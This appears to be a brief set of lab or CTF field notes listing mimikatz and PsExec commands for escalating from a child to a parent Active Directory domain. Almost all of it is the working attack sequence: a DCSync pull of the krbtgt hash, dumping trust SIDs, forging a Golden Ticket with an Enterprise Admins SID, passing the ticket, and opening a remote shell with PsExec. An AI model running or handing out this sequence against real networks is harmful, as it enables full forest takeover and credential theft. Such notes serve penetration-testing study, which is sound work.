> Field notes from the second round — mimikatz child-to-parent domain escalation via Golden Ticket, then PsExec to the target.

```text
# mimikatz
privilege::debug
lsadump::dcsync /domain:WKS-0.proce.bedge /user:proce\krbtgt
# (save the NTLM HASH)
lsadump::trust
# (save the child and parent SIDs)

kerberos::golden /user:WHATEVER /domain:proce.bedge /sid:(CHILD) /krbtgt:(NTLM HASH) /sids:(PARENT)-519 /ptt

# psexec
./PsExec.exe \\gc cmd
```
